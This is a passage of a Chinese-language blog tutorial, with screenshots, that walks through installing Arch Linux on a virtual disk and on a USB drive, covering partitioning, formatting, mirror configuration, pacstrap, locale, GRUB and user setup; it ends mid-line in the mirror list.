<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213131407202.png" alt="image-20210213131407202"></p>
<p>连接arch</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.0.111</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213131440235.png" alt="image-20210213131440235"></p>
<h1 id="查看硬盘"><a href="#查看硬盘" class="headerlink" title="查看硬盘"></a>查看硬盘</h1><div class="note info simple"><p>查看硬盘</p>
</div>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lsblk</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213120304984.png" alt="image-20210213120304984"></p>
<div class="note info simple"><p>查看一下路径</p>
</div>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213120605088.png" alt="image-20210213120605088"></p>
<h1 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h1><p>用的是<code>fdisk</code>命令参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-b&lt;分区大小&gt;：指定每个分区的大小；</span><br><span class="line">-l：列出指定的外围设备的分区表状况；</span><br><span class="line">-s&lt;分区编号&gt;：将指定的分区大小输出到标准输出上，单位为区块；</span><br><span class="line">-u：搭配&quot;-l&quot;参数列表，会用分区数目取代柱面数目，来表示每个分区的起始地址；</span><br><span class="line">-v：显示版本信息。</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>查看硬盘位置</p>
</div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fdisk 硬盘路径</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213120945130.png" alt="image-20210213120945130"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213121026786.png" alt="image-20210213121026786"></p>
<div class="note info simple"><p>我们可以输入<code>m</code>查看帮助</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213121111746.png" alt="image-20210213121111746"></p>
<p>给你们翻译一下</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213121409003.png" alt="image-20210213121409003"></p>
<h2 id="创建第一个bios分区"><a href="#创建第一个bios分区" class="headerlink" title="创建第一个bios分区"></a>创建第一个bios分区</h2><p><strong>这个分区我准备给他512m</strong></p>
<div class="note info simple"><p>创建第一个扇区<code>n</code></p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213133607300.png" alt="image-20210213133607300"></p>
<p>翻译一下意思他的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213133646803.png" alt="image-20210213133646803"></p>
<p>我们可以输入<code>p</code>查看配置的那个分区</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213133810256.png" alt="image-20210213133810256"></p>
<h2 id="创建第二个swap分区"><a href="#创建第二个swap分区" class="headerlink" title="创建第二个swap分区"></a>创建第二个swap分区</h2><p><strong>我了给他2G</strong></p>
<div class="note info simple"><p>创建第二个扇区<code>n</code></p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213134554554.png" alt="image-20210213134554554"></p>
<h2 id="创建第三个-分区"><a href="#创建第三个-分区" class="headerlink" title="创建第三个/分区"></a>创建第三个/分区</h2><p><strong>剩下的全部都给/分区</strong></p>
<div class="note info simple"><p>创建第三个扇区<code>n</code>，下面全部回车就可以了</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213134814160.png" alt="image-20210213134814160"></p>
<h2 id="查看一下分的区"><a href="#查看一下分的区" class="headerlink" title="查看一下分的区"></a>查看一下分的区</h2><div class="note info simple"><p>我们可以输入<code>p</code>查看配置的那个分区</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213134934579.png" alt="image-20210213134934579"></p>
<div class="note info simple"><p>用w保存并退出</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213135235991.png" alt="image-20210213135235991"></p>
<h1 id="格式化硬盘"><a href="#格式化硬盘" class="headerlink" title="格式化硬盘"></a>格式化硬盘</h1><p>用<code>p</code>可以看见他的路径</p>
<p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkfs.ext2 &#x2F;dev&#x2F;sda1</span><br><span class="line">mkswap &#x2F;dev&#x2F;sda2</span><br><span class="line">mkfs.ext4 &#x2F;dev&#x2F;sda3</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213135327918.png" alt="image-20210213135327918"></p>
<h1 id="激活swap分区"><a href="#激活swap分区" class="headerlink" title="激活swap分区"></a>激活swap分区</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">swapon &#x2F;dev&#x2F;sda2</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213135450483.png" alt="image-20210213135450483"></p>
<h1 id="挂载分区"><a href="#挂载分区" class="headerlink" title="挂载分区"></a>挂载分区</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mount /dev/sda3 /mnt <span class="comment"># 将/dev/sda3挂载到/mnt</span></span><br><span class="line">mkdir /mnt/boot  <span class="comment"># 创建boot文件</span></span><br><span class="line">mount /dev/sda1 /mnt/boot <span class="comment"># 将/dev/sda1挂载到/mnt/boot</span></span><br></pre></td></tr></table></figure>
<h1 id="配置源"><a href="#配置源" class="headerlink" title="配置源"></a>配置源</h1><p><strong>叫国内的源放到一个</strong></p>
<p>他的源在<code>/etc/pacman.d/mirrorlist</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;pacman.d&#x2F;mirrorlist</span><br></pre></td></tr></table></figure>
<p>应为我在网页的里面下载的镜像他默认都配置好了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213142253593.png" alt="image-20210213142253593"></p>
<p>我这个列出几个国内的源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.163.com&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.bfsu.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.bfsu.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.cqu.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.cqu.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.dgut.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.dgut.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.hit.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.hit.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirror.lzu.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.nju.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.nju.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirror.redrock.team&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirror.redrock.team&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.sjtug.sjtu.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.xjtu.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br></pre></td></tr></table></figure>
<p>更新一下源看看命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pacman -Syy</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213143005196.png" alt="image-20210213143005196"></p>
<h1 id="必须包安装"><a href="#必须包安装" class="headerlink" title="必须包安装"></a>必须包安装</h1><p>命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pacstrap /mnt/ base linux  linux-firmware </span><br></pre></td></tr></table></figure>
<p>安装可能要点时间</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213144647740.png" alt="image-20210213144647740"></p>
<h1 id="生成创建fstab文件"><a href="#生成创建fstab文件" class="headerlink" title="生成创建fstab文件"></a>生成创建fstab文件</h1><div class="note info simple"><p>fstab是非常重要的一个文件，当系统启动的时候，系统会自动地从这个文件读取信息，并且会自动将此文件中指定的文件系统挂载到指定的目录</p>
</div>

<p>分别使用<code>-U</code>或<code>-L</code>定义<a href="https://wiki.archlinux.org/index.php/UUID">UUID</a>或标签</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213145159513.png" alt="image-20210213145159513"> </p>
<p>查看一下他的内容</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213145222289.png" alt="image-20210213145222289"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Static information about the filesystems.</span><br><span class="line"># See fstab(5) for details.</span><br><span class="line"></span><br><span class="line"># &lt;file system&gt; &lt;dir&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;</span><br><span class="line"># &#x2F;dev&#x2F;sda3</span><br><span class="line">UUID&#x3D;01f973b0-f6af-4498-ac68-e05ff66c8896       &#x2F;               ext4            rw,relatime     0 1</span><br><span class="line"></span><br><span class="line"># &#x2F;dev&#x2F;sda1</span><br><span class="line">UUID&#x3D;584b928e-591c-44ed-827b-4f42003a1a29       &#x2F;boot           ext2            rw,relatime     0 2</span><br><span class="line"></span><br><span class="line"># &#x2F;dev&#x2F;sda2</span><br><span class="line">UUID&#x3D;b1fb0e39-31e9-49ff-9fd8-31531d492549       none            swap            defaults        0 0</span><br></pre></td></tr></table></figure>

<h1 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h1><h2 id="切换到新系统"><a href="#切换到新系统" class="headerlink" title="切换到新系统"></a>切换到新系统</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">arch-chroot /mnt</span><br></pre></td></tr></table></figure>
<p>可以看见到了新系统里面</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213145823307.png" alt="image-20210213145823307"></p>
<h2 id="基本的工具安装"><a href="#基本的工具安装" class="headerlink" title="基本的工具安装"></a>基本的工具安装</h2><p><strong>下面的东西都是很重要的比如基本的命令ifconfig就是net-tools包，连接网线dhcpcd，声音输入输出alsa-utils等等</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pacman -S  vim bash-completion  pulseaudio pulseaudio-alsa  networkmanager sudo dhcpcd net-tools alsa-utils openssh</span><br></pre></td></tr></table></figure>
<p>设置开机自启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable dhcpcd</span><br><span class="line">systemctl enable NetworkManager</span><br></pre></td></tr></table></figure>


<h2 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h2><p>可以在这个地址查看自己的市区访问一下就可以了<a href="https://ipapi.co/">https://ipapi.co/</a></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213150751471.png" alt="image-20210213150751471"></p>
<p>格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;地区&#x2F;城市 &#x2F;etc&#x2F;localtime</span><br></pre></td></tr></table></figure>
<p>我输入的是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtime</span><br></pre></td></tr></table></figure>
<p>然后设置硬件时钟</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hwclock --systohc</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213151033632.png" alt="image-20210213151033632"></p>
<h2 id="设置系统语言"><a href="#设置系统语言" class="headerlink" title="设置系统语言"></a>设置系统语言</h2><p>语言配置在<code>/etc/locale.gen</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;locale.gen</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>叫这个<code>es_US.UTF-8 UTF-8</code>注释去掉</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213151608543.png" alt="image-20210213151608543"></p>
<div class="note info simple"><p>这个<code>locale-gen</code>命令生成语言环境</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213151947887.png" alt="image-20210213151947887"></p>
<div class="note info simple"><p>语言环境配置文件，文件在<code>/etc/locale.conf</code>，写入<code>LANG=en_US.UTF-8</code></p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213152341325.png" alt="image-20210213152341325"></p>
<h2 id="设置键盘布局"><a href="#设置键盘布局" class="headerlink" title="设置键盘布局"></a>设置键盘布局</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;vconsole.conf</span><br></pre></td></tr></table></figure>
<p>内容，这个我也不太知道我就不改了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">KEYMAP&#x3D;键盘布局名字</span><br></pre></td></tr></table></figure>
<h2 id="root密码"><a href="#root密码" class="headerlink" title="root密码"></a>root密码</h2><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213154442653.png" alt="image-20210213154442653"></p>
<h1 id="网络配置-1"><a href="#网络配置-1" class="headerlink" title="网络配置"></a>网络配置</h1><h2 id="设置网络主机名"><a href="#设置网络主机名" class="headerlink" title="设置网络主机名"></a>设置网络主机名</h2><p>文件在<code>/etc/hostname</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;hostname</span><br></pre></td></tr></table></figure>
<p>我的文件内容zss</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213153756918.png" alt="image-20210213153756918"></p>
<h2 id="网络配置-2"><a href="#网络配置-2" class="headerlink" title="网络配置"></a>网络配置</h2><p>文件在<code>/etc/hosts</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure>
<p>打开是这样的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213154101678.png" alt="image-20210213154101678"></p>
<p>格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1	localhost</span><br><span class="line">::1		localhost</span><br><span class="line">127.0.1.1	主机名.localdomain	主机名</span><br></pre></td></tr></table></figure>
<p>我的配置</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213154226226.png" alt="image-20210213154226226"></p>
<h1 id="安装微代码"><a href="#安装微代码" class="headerlink" title="安装微代码"></a>安装微代码</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pacman -S intel-ucode</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213155519502.png" alt="image-20210213155519502"></p>
<h1 id="安装引导和配置"><a href="#安装引导和配置" class="headerlink" title="安装引导和配置"></a>安装引导和配置</h1><p>安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pacman -S grub efibootmgr  os-prober</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>grub主引导</p>
</div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grub-install &#x2F;dev&#x2F;sda</span><br><span class="line">grub-mkconfig -o &#x2F;boot&#x2F;grub&#x2F;grub.cfg</span><br></pre></td></tr></table></figure>
<h1 id="添加用户和权限"><a href="#添加用户和权限" class="headerlink" title="添加用户和权限"></a>添加用户和权限</h1><h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><div class="note info simple"><p>useradd命令是创建用户用的下面的意思是叫zss用户添加到wheel组里面</p>
</div>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">useradd -m -G wheel zss</span><br></pre></td></tr></table></figure>
<h2 id="给与权限"><a href="#给与权限" class="headerlink" title="给与权限"></a>给与权限</h2><p>命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">EDITOR=vim visudo</span><br></pre></td></tr></table></figure>
<p>叫这个注释去掉</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210213183354671.png" alt="image-20210213183354671"></p>
<h2 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">passwd 用户名</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213183800585.png" alt="image-20210213183800585"></p>
<h1 id="基本系统安装完"><a href="#基本系统安装完" class="headerlink" title="基本系统安装完"></a>基本系统安装完</h1><div class="note info simple"><p>退出</p>
</div>

<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213160959765.png" alt="image-20210213160959765"></p>
<div class="note info simple"><p>取消挂载</p>
</div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">umount -R &#x2F;mnt</span><br></pre></td></tr></table></figure>

<div class="note info simple"><p>重启</p>
</div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>
<p>可以看见安装好了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213161036009.png" alt="image-20210213161036009"></p>
<div class="note info simple"><p>我登录进入</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213161437059.png" alt="image-20210213161437059"></p>
<p>安装一个<code>neofetch</code>看看效果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S neofetch  </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213204300455.png" alt="image-20210213204300455"></p>
<h1 id="叫ahrc安装到U盘"><a href="#叫ahrc安装到U盘" class="headerlink" title="叫ahrc安装到U盘"></a>叫ahrc安装到U盘</h1><div class="note info simple"><p>他的和普通安装一样没有什么区别下面的演示很多是上面复制下来的</p>
</div>
<div class="note info simple"><p>应为我的电脑启动的是UEFI，下面演示的都是UEFI的，用的VM安装到U盘里面然后 插在电脑上启动的</p>
</div>


<h2 id="网络时间同步-1"><a href="#网络时间同步-1" class="headerlink" title="网络时间同步"></a>网络时间同步</h2><div class="note info simple"><p>如果时间不同步是不能在网络上下载东西的应为你的时间不对</p>
</div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">timedatectl set-ntp true</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213124949333.png" alt="image-20210213124949333"></p>
<p>检查一下时间</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">timedatectl status</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213130358106.png" alt="image-20210213130358106"></p>
<h2 id="连接arch的ssh-1"><a href="#连接arch的ssh-1" class="headerlink" title="连接arch的ssh"></a>连接arch的ssh</h2><div class="note info simple"><p>在vm里面真的是不好操作arch他是启动了ssh了的</p>
</div>

<p>设置root密码<code>passwd</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213131246692.png" alt="image-20210213131246692"></p>
<div class="note info simple"><p>查看ip</p>
</div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213131407202.png" alt="image-20210213131407202"></p>
<p>连接arch</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.0.111</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213131440235.png" alt="image-20210213131440235"></p>
<h2 id="分区-1"><a href="#分区-1" class="headerlink" title="分区"></a>分区</h2><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsblk</span><br></pre></td></tr></table></figure>
<p>可以看见U盘已经在里面了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210316111837781.png" alt="image-20210316111837781"></p>
<p>用查看他的路径 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210316112618715.png" alt="image-20210316112618715"></p>
<p>然后用<code>fdisk /dev/sda</code>进行分区</p>
<p>上面有详细的说明这个我就不说了</p>
<ul>
<li><p>第一个分区是boot分区是512M</p>
</li>
<li><p>第二个分区是/分区是27G</p>
</li>
<li><p>第三个是最后全部的硬盘都给了swap分区</p>
</li>
</ul>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210316112915856.png" alt="image-20210316112915856"></p>
<h2 id="格式化分区"><a href="#格式化分区" class="headerlink" title="格式化分区"></a>格式化分区</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mkfs.vfat /dev/sda1</span><br><span class="line">mkfs.ext4 /dev/sda2</span><br><span class="line">mkswap /dev/sda3</span><br></pre></td></tr></table></figure>
<p>图</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210316140412670.png" alt="image-20210316140412670"></p>
<h2 id="激活swap分区-1"><a href="#激活swap分区-1" class="headerlink" title="激活swap分区"></a>激活swap分区</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">swapon &#x2F;dev&#x2F;sda3 </span><br></pre></td></tr></table></figure>

<h2 id="挂载分区-1"><a href="#挂载分区-1" class="headerlink" title="挂载分区"></a>挂载分区</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount &#x2F;dev&#x2F;sda2 &#x2F;mnt # 叫&#x2F;dev&#x2F;sda2挂载到&#x2F;mnt</span><br><span class="line">mkdir -p &#x2F;mnt&#x2F;boot&#x2F;efi  # 创建&#x2F;boot&#x2F;efi文件</span><br><span class="line">mount &#x2F;dev&#x2F;sda1 &#x2F;mnt&#x2F;boot&#x2F;efi #叫 &#x2F;dev&#x2F;sda1挂载到&#x2F;mnt&#x2F;boot&#x2F;efi</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210316113614518.png" alt="image-20210316113614518"></p>
<h2 id="配置源-1"><a href="#配置源-1" class="headerlink" title="配置源"></a>配置源</h2><p><strong>叫国内的源放到一个</strong></p>
<p>他的源在<code>/etc/pacman.d/mirrorlist</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;pacman.d&#x2F;mirrorlist</span><br></pre></td></tr></table></figure>
<p>应为我在网页的里面下载的镜像他默认都配置好了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210213142253593.png" alt="image-20210213142253593"></p>
<p>我这个列出几个国内的源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.163.com&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.bfsu.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.bfsu.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.cqu.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.cqu.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.dgut.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.dgut.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.hit.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.hit.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirror.lzu.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; 